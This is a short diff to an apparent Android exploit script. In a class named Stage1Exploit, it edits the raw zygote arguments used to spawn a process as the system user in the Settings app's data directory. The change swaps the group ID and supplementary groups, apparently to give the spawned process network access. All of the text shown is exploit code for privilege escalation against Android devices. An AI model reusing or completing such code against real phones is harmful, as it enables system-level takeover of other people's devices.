@@ -190,8 +190,8 @@ class Stage1Exploit:
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
             "--setuid=1000",
-            "--setgid=1000",
-            "--setgroups=1065",
+            "--setgid=3003",
+            "--setgroups=1000",
             "--target-sdk-version=28",
             "--app-data-dir=/data/user/0/com.android.settings",
             "--runtime-args",
